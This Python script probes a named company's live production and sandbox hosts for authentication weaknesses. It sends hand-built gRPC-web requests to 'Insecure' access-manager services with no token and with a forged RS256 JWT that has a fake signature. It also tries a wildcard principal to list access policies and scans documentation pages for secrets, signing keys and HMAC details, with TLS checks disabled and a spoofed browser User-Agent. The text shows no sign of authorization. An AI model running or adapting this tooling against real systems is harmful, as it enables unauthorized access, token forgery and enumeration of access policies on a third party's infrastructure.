#!/usr/bin/env python3
"""
New findings:
1. anduril.auth.v3.InsecureAccessManagerAPI (v3!) - PutResources, ListPoliciesForPrincipalInsecure, ImpersonateTestPermissions
2. Developer docs at sandboxes.developer.anduril.com/docs/authentication  
3. Test if InsecureAccessManagerAPI is accessible without JWT (like most other services on catalog)
4. Test ListPoliciesForPrincipalInsecure without JWT
5. PutResources could write access policies
"""
import requests, json, struct, base64, re, os
requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
S = requests.Session()
S.verify = False

def _vi(v):
    r = b""
    while True:
        b = v & 0x7F; v >>= 7
        r += bytes([b|0x80]) if v else bytes([b])
        if not v: break
    return r
def ps(fn, s): v = s.encode(); return _vi((fn<<3)|2)+_vi(len(v))+v
def pb(fn, b): return _vi((fn<<3)|2)+_vi(len(b))+b
def pvi(fn, v): return _vi((fn<<3)|0)+_vi(v)
def gf(b): return b"\x00" + struct.pack(">I", len(b)) + b
def parse_grpc(data):
    frames = []
    i = 0
    while i < len(data):
        if i + 5 > len(data): break
        ftype = data[i]
        length = struct.unpack(">I", data[i+1:i+5])[0]
        body = data[i+5:i+5+length]
        frames.append((ftype, body))
        i += 5 + length
    return frames
def decode_trailers(raw):
    text = raw.decode('utf-8', errors='replace')
    info = {}
    for line in text.strip().split('\r\n'):
        if ':' in line:
            k, v = line.split(':', 1)
            info[k.strip().lower()] = v.strip()
    return info

catalog = "https://catalog.anduril.com"
sandbox = "https://sandboxes.developer.anduril.com"

def grpc_test(host, svc, method, body=None, auth=None, log_body=False):
    hdr = {
        "User-Agent": UA,
        "Content-Type": "application/grpc-web+proto",
        "Accept": "application/grpc-web+proto",
        "X-Grpc-Web": "1",
    }
    if auth:
        hdr["Authorization"] = auth
    if body is None:
        body = gf(b"")
    r = S.post(f"{host}/{svc}/{method}", data=body, headers=hdr, timeout=8, verify=False)
    gs = r.headers.get('grpc-status','')
    gm = r.headers.get('grpc-message','')
    frames = parse_grpc(r.content)
    body_bytes = b""
    for ftype, fbody in frames:
        if ftype == 0x80:
            t = decode_trailers(fbody); gs = gs or t.get('grpc-status',''); gm = gm or t.get('grpc-message','')
        elif ftype == 0x00:
            body_bytes = fbody
    return r.status_code, gs, gm, body_bytes

print("=" * 70)
print("1. DEVELOPER DOCS - READ AUTHENTICATION DOCS")
print("=" * 70)

doc_urls = [
    f"{sandbox}/docs",
    f"{sandbox}/docs/authentication",
    f"{sandbox}/docs/authentication/",
    "https://docs.anduril.com/",
    "https://docs.anduril.com/guides",
    "https://docs.anduril.com/reference",
]

for url in doc_urls:
    try:
        r = S.get(url, headers={"User-Agent": UA, "Accept": "text/html"}, 
                  timeout=8, allow_redirects=True, verify=False)
        print(f"\n  {url}: {r.status_code} ({len(r.content)}b)")
        if r.status_code == 200:
            text = r.text
            # Remove script tags and get visible text
            clean = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL)
            clean = re.sub(r'<style[^>]*>.*?</style>', '', clean, flags=re.DOTALL)
            clean = re.sub(r'<[^>]+>', ' ', clean)
            clean = re.sub(r'\s+', ' ', clean).strip()
            
            # Check for auth-relevant content
            for term in ['InsecureAuthAdmin', 'HS256', 'secret', 'jwt', 'signing', 'HMAC', 'bearer']:
                if term.lower() in clean.lower():
                    idx = clean.lower().find(term.lower())
                    print(f"    '{term}' found: {clean[max(0,idx-50):idx+200]}")
            
            # Print first 500 chars of visible text
            print(f"  Preview: {clean[:600]}")
    except Exception as e:
        print(f"  {url}: ERR {str(e)[:60]}")

print("\n\n" + "=" * 70)
print("2. TEST InsecureAccessManagerAPI WITHOUT JWT on CATALOG")
print("=" * 70)

# First test without JWT
print("\n  Testing without JWT:")
status, gs, gm, body = grpc_test(catalog, "anduril.auth.v3.InsecureAccessManagerAPI", "ListPoliciesForPrincipalInsecure")
print(f"  ListPoliciesForPrincipalInsecure (no JWT): HTTP {status} [{gs}] {gm[:150]}")

status, gs, gm, body = grpc_test(catalog, "anduril.auth.v3.InsecureAccessManagerAPI", "ImpersonateTestPermissions")
print(f"  ImpersonateTestPermissions (no JWT): HTTP {status} [{gs}] {gm[:150]}")

status, gs, gm, body = grpc_test(catalog, "anduril.auth.v3.InsecureAccessManagerAPI", "PutResources")
print(f"  PutResources (no JWT): HTTP {status} [{gs}] {gm[:150]}")

# Also test InsecureAuthAdmin without JWT (for reference)
status, gs, gm, body = grpc_test(catalog, "anduril.auth.v2.InsecureAuthAdmin", "ImpersonateTestPermissions")
print(f"\n  InsecureAuthAdmin/ImpersonateTestPermissions (no JWT): HTTP {status} [{gs}] {gm[:150]}")

# Test with a FAKE but properly formatted JWT  
h = base64.urlsafe_b64encode(json.dumps({"alg":"RS256","typ":"JWT"}).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({"sub":"test","iss":"https://anduril.okta.com","exp":9999999999}).encode()).rstrip(b'=').decode()
jwt_fake_rs256 = f"{h}.{p}.fakesig"

print("\n  Testing WITH fake JWT (RS256):")
status, gs, gm, body = grpc_test(catalog, "anduril.auth.v3.InsecureAccessManagerAPI", "ListPoliciesForPrincipalInsecure",
                                  auth=f"Bearer {jwt_fake_rs256}")
print(f"  ListPoliciesForPrincipalInsecure (fake JWT): HTTP {status} [{gs}] {gm[:200]}")

status, gs, gm, body = grpc_test(catalog, "anduril.auth.v3.InsecureAccessManagerAPI", "ImpersonateTestPermissions",
                                  auth=f"Bearer {jwt_fake_rs256}")
print(f"  ImpersonateTestPermissions (fake JWT): HTTP {status} [{gs}] {gm[:200]}")

print("\n\n" + "=" * 70)
print("3. CALL ListPoliciesForPrincipalInsecure WITH EMPTY REQUEST")
print("=" * 70)

# The request type is anduril.auth.v3.ListPoliciesForPrincipalInsecureRequest
# Fields: principalId (field 1), limit (field 2), pageToken (field 3)
# Try with empty request body
status, gs, gm, body_bytes = grpc_test(catalog, "anduril.auth.v3.InsecureAccessManagerAPI", 
                                        "ListPoliciesForPrincipalInsecure",
                                        body=gf(b""))
print(f"  Empty request: HTTP {status} [{gs}] {gm[:200]}")
if body_bytes:
    print(f"  Response body: {body_bytes.hex()}")
    print(f"  Response text: {body_bytes.decode('utf-8', errors='replace')[:200]}")

# Try with wildcard principal
req = ps(1, "*")  # principalId = "*"
status, gs, gm, body_bytes = grpc_test(catalog, "anduril.auth.v3.InsecureAccessManagerAPI", 
                                        "ListPoliciesForPrincipalInsecure",
                                        body=gf(req))
print(f"  principalId='*': HTTP {status} [{gs}] {gm[:200]}")

print("\n\n" + "=" * 70)
print("4. SEARCH CATALOG BUNDLE FOR InsecureAccessManagerAPI FULL DEFINITION")
print("=" * 70)

bundle_file = r"C:\Users\ya754\CaseCrack v1.0\_catalog_bundle_D1Me60L7.js"
with open(bundle_file, 'r', encoding='utf-8', errors='replace') as f:
    content = f.read()

# Find InsecureAccessManagerAPI
idx = content.find('"anduril.auth.v3.InsecureAccessManagerAPI"')
if idx != -1:
    section = content[idx:idx+3000]
    methods = re.findall(r'methodName:"([^"]+)"', section)
    print(f"  InsecureAccessManagerAPI methods: {methods}")
    print(f"\n  Full definition (2000 chars): {section[:2000]}")
else:
    # Try alternate lookup
    idx = content.find('InsecureAccessManagerAPI')
    if idx != -1:
        print(f"  Found at {idx}: {content[max(0,idx-100):idx+1000]}")

print("\n\n" + "=" * 70)
print("5. LOOK AT THE AUTH v3 IMPERSONATETESTPERMISSIONS - DIFFERENT THAN v2?")
print("=" * 70)

# From the bundle analysis, ImpersonateTestPermissions appears in BOTH:
# - anduril.auth.v2.InsecureAuthAdmin
# - anduril.auth.v3.InsecureAccessManagerAPI
# Let's see both service definitions

for svc_pat in ['"anduril.auth.v2.InsecureAuthAdmin"', '"anduril.auth.v3.InsecureAccessManagerAPI"']:
    idx = content.find(svc_pat)
    if idx != -1:
        ctx = content[max(0,idx-200):idx+500]
        print(f"\n  {svc_pat}:")
        print(f"  {ctx[:700]}")

print("\n\n" + "=" * 70)
print("6. LOOK FOR AUTH CONFIG IN DEVELOPER DOCS ASSETS")
print("=" * 70)

# The developer docs likely have JavaScript that might reference auth config
doc_assets = [
    f"{sandbox}/docs/",
    "https://docs.anduril.com/assets/js/main.js",
    "https://docs.anduril.com/assets/main.js",
]
for url in doc_assets[:1]:
    try:
        r = S.get(url, headers={"User-Agent": UA, "Accept": "text/html"}, timeout=10, verify=False)
        print(f"\n  {url}: {r.status_code}")
        text = r.text
        # Look for script src URLs
        scripts = re.findall(r'src=["\']([^"\']+)["\']', text)[:10]
        print(f"  Script tags: {scripts}")
        # Look for any token/auth references in the HTML
        for term in ['token', 'auth', 'jwt', 'secret', 'signing', 'client_id']:
            if term.lower() in text.lower():
                idx2 = text.lower().find(term.lower())
                print(f"  '{term}': {text[max(0,idx2-30):idx2+100]}")
    except Exception as e:
        print(f"  ERR: {e}")

print("\n\n" + "=" * 70)
print("7. TEST InsecureAccessManagerAPI WITHOUT JWT ON PROVING-GROUND")
print("=" * 70)

pg = "https://proving-ground.anduril.com"
status, gs, gm, body = grpc_test(pg, "anduril.auth.v3.InsecureAccessManagerAPI", "ListPoliciesForPrincipalInsecure")
print(f"  PG ListPoliciesForPrincipalInsecure (no JWT): HTTP {status} [{gs}] {gm[:150]}")

status, gs, gm, body = grpc_test(pg, "anduril.auth.v3.InsecureAccessManagerAPI", "ImpersonateTestPermissions")
print(f"  PG ImpersonateTestPermissions (no JWT): HTTP {status} [{gs}] {gm[:150]}")

print("\n[DONE]")
